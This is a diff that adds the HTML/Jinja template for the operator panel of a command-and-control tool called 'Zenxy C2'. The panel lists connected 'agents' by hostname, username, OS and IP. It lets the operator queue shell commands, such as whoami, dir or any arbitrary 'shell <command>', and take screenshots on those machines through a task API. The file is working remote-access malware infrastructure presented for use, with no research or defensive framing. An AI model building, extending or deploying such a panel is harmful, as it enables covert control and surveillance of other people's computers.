@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Zenxy C2</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        body { background: #050505; font-family: 'Inter', sans-serif; }
+        .glass { background: rgba(13,13,13,0.75); backdrop-filter: blur(16px); border: 1px solid rgba(255,255,255,0.1); }
+        .glass-hover:hover { border-color: rgba(255,255,255,0.35); transform: translateY(-2px); }
+        ::-webkit-scrollbar { width: 6px; }
+        ::-webkit-scrollbar-track { background: #050505; }
+        ::-webkit-scrollbar-thumb { background: #333; border-radius: 3px; }
+    </style>
+</head>
+<body class="min-h-screen text-white">
+    <!-- Header -->
+    <header class="glass border-b border-white/10 sticky top-0 z-50">
+        <div class="max-w-7xl mx-auto px-4 h-16 flex items-center justify-between">
+            <div class="flex items-center gap-3">
+                <div class="w-9 h-9 bg-white text-black rounded-lg flex items-center justify-center font-black">Z</div>
+                <div>
+                    <span class="font-black tracking-wider">ZENXY <span class="text-gray-400 font-light">C2</span></span>
+                    <span class="block text-[9px] font-mono text-gray-500 tracking-widest">AGENT CONTROL</span>
+                </div>
+            </div>
+            <div class="flex items-center gap-4 text-xs font-mono">
+                <span class="text-gray-400"><span id="onlineCount">0</span> online</span>
+                <a href="/logout" class="text-gray-400 hover:text-white">Logout</a>
+            </div>
+        </div>
+    </header>
+
+    <main class="max-w-7xl mx-auto px-4 py-8">
+        <div class="flex items-center justify-between mb-6">
+            <h2 class="text-xl font-bold">Agents</h2>
+            <button onclick="location.reload()" class="text-xs font-mono text-gray-400 hover:text-white">
+                <i class="fa-solid fa-rotate-right mr-1"></i> Refresh
+            </button>
+        </div>
+
+        <div id="agentGrid" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
+            {% for aid, a in agents.items() %}
+            <div class="glass glass-hover rounded-2xl p-5 transition cursor-pointer" onclick="openAgent('{{ aid }}')">
+                <div class="flex items-start justify-between mb-3">
+                    <div>
+                        <p class="font-bold text-sm">{{ a.hostname }}</p>
+                        <p class="text-xs text-gray-400 font-mono">{{ a.username }}</p>
+                    </div>
+                    <span class="w-2.5 h-2.5 rounded-full {% if a.online %}bg-white shadow-[0_0_8px_#fff]{% else %}bg-gray-600{% endif %}"></span>
+                </div>
+                <div class="text-[11px] font-mono text-gray-500 space-y-1">
+                    <p>{{ a.os }}</p>
+                    <p>{{ a.ip }}</p>
+                    <p>ID: {{ aid[:12] }}…</p>
+                </div>
+            </div>
+            {% else %}
+            <div class="col-span-full text-center py-20 text-gray-500 font-mono text-sm">
+                No agents connected yet
+            </div>
+            {% endfor %}
+        </div>
+    </main>
+
+    <!-- Agent Modal -->
+    <div id="agentModal" class="fixed inset-0 bg-black/80 backdrop-blur-sm z-50 hidden flex items-center justify-center p-4">
+        <div class="glass rounded-2xl w-full max-w-2xl max-h-[90vh] overflow-hidden flex flex-col">
+            <div class="p-5 border-b border-white/10 flex items-center justify-between">
+                <div>
+                    <h3 id="modalTitle" class="font-bold"></h3>
+                    <p id="modalSub" class="text-xs text-gray-400 font-mono"></p>
+                </div>
+                <button onclick="closeModal()" class="text-gray-400 hover:text-white text-xl">&times;</button>
+            </div>
+            <div class="p-5 space-y-4 overflow-y-auto">
+                <div class="flex flex-wrap gap-2">
+                    <button onclick="sendCmd('shell whoami')" class="px-3 py-1.5 rounded-lg bg-white/10 hover:bg-white/20 text-xs font-mono">whoami</button>
+                    <button onclick="sendCmd('shell hostname')" class="px-3 py-1.5 rounded-lg bg-white/10 hover:bg-white/20 text-xs font-mono">hostname</button>
+                    <button onclick="sendCmd('shell dir')" class="px-3 py-1.5 rounded-lg bg-white/10 hover:bg-white/20 text-xs font-mono">dir</button>
+                    <button onclick="sendCmd('screenshot')" class="px-3 py-1.5 rounded-lg bg-white/10 hover:bg-white/20 text-xs font-mono">screenshot</button>
+                    <button onclick="sendCmd('info')" class="px-3 py-1.5 rounded-lg bg-white/10 hover:bg-white/20 text-xs font-mono">info</button>
+                </div>
+                <div class="flex gap-2">
+                    <input id="cmdInput" type="text" placeholder="shell <command>" 
+                           class="flex-1 px-3 py-2 rounded-xl bg-black border border-white/10 text-sm font-mono focus:outline-none focus:border-white/30"
+                           onkeydown="if(event.key==='Enter')sendCustom()">
+                    <button onclick="sendCustom()" class="px-4 py-2 rounded-xl bg-white text-black font-bold text-xs">Send</button>
+                </div>
+                <pre id="output" class="bg-black rounded-xl p-4 text-xs font-mono text-gray-300 h-64 overflow-y-auto border border-white/5"></pre>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let currentAgent = null;
+
+        function openAgent(id) {
+            currentAgent = id;
+            document.getElementById('agentModal').classList.remove('hidden');
+            document.getElementById('modalTitle').innerText = id.slice(0, 16) + '…';
+            document.getElementById('modalSub').innerText = 'Ready';
+            document.getElementById('output').innerText = '';
+        }
+
+        function closeModal() {
+            document.getElementById('agentModal').classList.add('hidden');
+            currentAgent = null;
+        }
+
+        async function sendCmd(cmd) {
+            if (!currentAgent) return;
+            document.getElementById('output').innerText += `\n> ${cmd}\n`;
+            const res = await fetch('/api/task', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({agent_id: currentAgent, cmd: cmd})
+            });
+            const data = await res.json();
+            document.getElementById('output').innerText += `[task ${data.task_id}] queued\n`;
+        }
+
+        function sendCustom() {
+            const v = document.getElementById('cmdInput').value.trim();
+            if (v) {
+                sendCmd(v);
+                document.getElementById('cmdInput').value = '';
+            }
+        }
+
+        // update online count
+        document.getElementById('onlineCount').innerText = 
+            document.querySelectorAll('.bg-white.shadow-\\[0_0_8px_\\#fff\\]').length;
+    </script>
+</body>
+</html>
